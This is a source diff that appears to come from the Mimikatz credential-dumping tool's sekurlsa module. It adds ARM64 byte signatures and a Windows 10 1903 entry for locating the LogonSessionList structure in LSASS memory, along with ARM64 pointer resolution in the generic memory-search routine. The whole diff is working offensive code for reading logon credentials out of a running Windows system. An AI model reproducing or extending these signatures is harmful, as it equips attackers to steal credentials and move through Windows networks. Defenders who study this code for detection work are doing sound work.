@@ -5,7 +5,12 @@
 */
 #include "kuhl_m_sekurlsa_utils.h"
 
-#ifdef _M_X64
+#if defined(_M_ARM64)
+BYTE PTRN_WN1803_LogonSessionList[] = {0xf9, 0x03, 0x00, 0xaa, 0x58, 0xe7, 0x00, 0xa9};
+KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
+	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {-8, 4, -16, 4}},
+};
+#elif defined(_M_X64)
 BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
 BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
 BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
@@ -23,8 +28,9 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
 	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
 	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
+	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WN51_LogonSessionList[]	= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
 BYTE PTRN_WNO8_LogonSessionList[]	= {0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd};
 BYTE PTRN_WN80_LogonSessionList[]	= {0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74};
@@ -54,7 +60,7 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference;
-	#ifdef _M_X64
+	#if defined(_M_X64)
 		LONG offset;
 	#endif
 
@@ -66,11 +72,14 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
 			if(genericOffset1)
 				*genericOffset1 = currentReference->Offsets.off1;
-		#ifdef _M_X64
+		#if defined(_M_ARM64)
+			*genericPtr = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0); // TODO:ARM64
+			pLib->isInit = (*genericPtr) ? TRUE : FALSE;
+		#elif defined(_M_X64)
 			aLocalMemory.address = &offset;
 			if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
 				*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
-		#elif defined _M_IX86
+		#elif defined(_M_IX86)
 			aLocalMemory.address = genericPtr;
 			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
 		#endif
@@ -78,11 +87,14 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 			if(genericPtr1)
 			{
 				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
-			#ifdef _M_X64
+			#if defined(_M_ARM64)
+				*genericPtr1 = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff1); // TODO:ARM64
+				pLib->isInit = (*genericPtr1) ? TRUE : FALSE;
+			#elif defined(_M_X64)
 				aLocalMemory.address = &offset;
 				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
 					*genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
-			#elif defined _M_IX86
+			#elif defined(_M_IX86)
 				aLocalMemory.address = genericPtr1;
 				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
 			#endif
@@ -91,11 +103,14 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 			if(genericPtr2)
 			{
 				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
-			#ifdef _M_X64
+			#if defined(_M_ARM64)
+				*genericPtr2 = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff2); // TODO:ARM64
+				pLib->isInit = (*genericPtr2) ? TRUE : FALSE;
+			#elif defined(_M_X64)
 				aLocalMemory.address = &offset;
 				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
 					*genericPtr2 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
-			#elif defined _M_IX86
+			#elif defined(_M_IX86)
 				aLocalMemory.address = genericPtr2;
 				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
 			#endif
